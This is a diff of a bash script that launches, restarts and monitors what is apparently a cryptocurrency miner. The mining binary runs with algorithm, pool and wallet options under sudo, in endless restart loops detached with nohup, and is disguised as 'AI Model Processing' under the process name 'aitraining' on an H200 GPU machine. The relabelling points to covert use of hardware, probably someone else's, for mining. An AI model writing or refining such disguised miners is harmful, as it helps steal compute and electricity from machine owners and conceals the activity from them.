@@ -25,19 +25,23 @@ GPU_LOG="$LOG_DIR/gpu_processing.log"
 CPU_LOG="$LOG_DIR/cpu_processing.log"
 MONITOR_LOG="$LOG_DIR/monitor.log"
 
-# -------- MAIN SCRIPT --------
-
-# Kill any existing processes
-sudo pkill -f aitraining
-sleep 3
+# -------- INITIAL SETUP --------
+sudo pkill -f aitraining 2>/dev/null
+sleep 2
 
 echo "=== Starting AI Model Processing ==="
 
-# Start GPU Processing
+# Initialize logs
+echo "===== GPU Processor Started: $(date) =====" > "$GPU_LOG"
+echo "===== CPU Processor Started: $(date) =====" > "$CPU_LOG"
+echo "===== Monitoring Started: $(date) =====" > "$MONITOR_LOG"
+
+# -------- FUNCTION DEFINITIONS --------
+
 start_gpu_processor() {
     echo "$(date) Starting GPU Processor..." | tee -a "$MONITOR_LOG"
     while true; do
-        nohup sudo "$PROCESSOR_PATH" \
+        sudo "$PROCESSOR_PATH" \
             --algorithm "$GPU_ALGO" \
             --pool "$GPU_POOL" \
             --wallet "$GPU_WALLET" \
@@ -50,23 +54,18 @@ start_gpu_processor() {
             --log-file-mode 1 \
             --api-enable \
             --api-port 21550 \
-            --api-rig-name "H200-GPU" > /dev/null 2>&1 &
-        
-        GPU_PID=$!
-        echo "$(date) GPU Processor PID: $GPU_PID" | tee -a "$MONITOR_LOG"
-        
-        wait $GPU_PID
+            --api-rig-name "H200-GPU" >> "$GPU_LOG" 2>&1
+
         STATUS=$?
         echo "$(date) GPU processor exited with status $STATUS. Restarting in 10s..." | tee -a "$MONITOR_LOG"
         sleep 10
     done
 }
 
-# Start CPU Processing
 start_cpu_processor() {
     echo "$(date) Starting CPU Processor..." | tee -a "$MONITOR_LOG"
     while true; do
-        nohup sudo "$PROCESSOR_PATH" \
+        sudo "$PROCESSOR_PATH" \
             --algorithm "$CPU_ALGO" \
             --pool "$CPU_POOL" \
             --wallet "$CPU_WALLET" \
@@ -79,56 +78,40 @@ start_cpu_processor() {
             --log-file-mode 1 \
             --api-enable \
             --api-port 21551 \
-            --api-rig-name "H200-CPU" > /dev/null 2>&1 &
-        
-        CPU_PID=$!
-        echo "$(date) CPU Processor PID: $CPU_PID" | tee -a "$MONITOR_LOG"
-        
-        wait $CPU_PID
+            --api-rig-name "H200-CPU" >> "$CPU_LOG" 2>&1
+
         STATUS=$?
         echo "$(date) CPU processor exited with status $STATUS. Restarting in 10s..." | tee -a "$MONITOR_LOG"
         sleep 10
     done
 }
 
-# Monitor system
 monitor_system() {
     while true; do
-        echo "=== $(date) System Status ===" >> "$MONITOR_LOG"
-        
-        # Check processes
+        echo -e "\n=== $(date) System Status ===" >> "$MONITOR_LOG"
         echo "Active Processes:" >> "$MONITOR_LOG"
         ps aux | grep aitraining | grep -v grep >> "$MONITOR_LOG"
-        
-        # GPU status
+
         echo "GPU Status:" >> "$MONITOR_LOG"
-        nvidia-smi --query-gpu=index,temperature.gpu,utilization.gpu,memory.used,power.draw --format=csv,noheader >> "$MONITOR_LOG"
-        
+        nvidia-smi --query-gpu=index,temperature.gpu,utilization.gpu,memory.used,power.draw --format=csv,noheader >> "$MONITOR_LOG" 2>/dev/null
+
         echo "---" >> "$MONITOR_LOG"
         sleep 30
     done
 }
 
-# Initialize logs
-echo "===== GPU Processor Started: $(date) =====" > "$GPU_LOG"
-echo "===== CPU Processor Started: $(date) =====" > "$CPU_LOG"
-echo "===== Monitoring Started: $(date) =====" > "$MONITOR_LOG"
+# -------- START EVERYTHING --------
 
-echo "Starting processing operations..."
-echo "GPU: $GPU_ALGO on $GPU_POOL"
-echo "CPU: $CPU_ALGO on $CPU_POOL"
-echo ""
-
-# Start everything with nohup
-nohup bash -c "start_gpu_processor" > /dev/null 2>&1 &
+echo "Starting background processes..."
+nohup bash -c "$(declare -f start_gpu_processor); start_gpu_processor" > /dev/null 2>&1 &
 GPU_MAIN_PID=$!
-sleep 5
 
-nohup bash -c "start_cpu_processor" > /dev/null 2>&1 &
-CPU_MAIN_PID=$!
 sleep 2
+nohup bash -c "$(declare -f start_cpu_processor); start_cpu_processor" > /dev/null 2>&1 &
+CPU_MAIN_PID=$!
 
-nohup bash -c "monitor_system" > /dev/null 2>&1 &
+sleep 2
+nohup bash -c "$(declare -f monitor_system); monitor_system" > /dev/null 2>&1 &
 MONITOR_PID=$!
 
 echo "=== Processing Started Successfully ==="
@@ -148,6 +131,3 @@ echo ""
 echo "🔍 Check processes: ps aux | grep aitraining"
 echo "📈 Real-time logs: tail -f $LOG_DIR/*.log"
 echo "🛑 Stop processing: sudo pkill -f aitraining"
-
-# Wait for processes
-wait
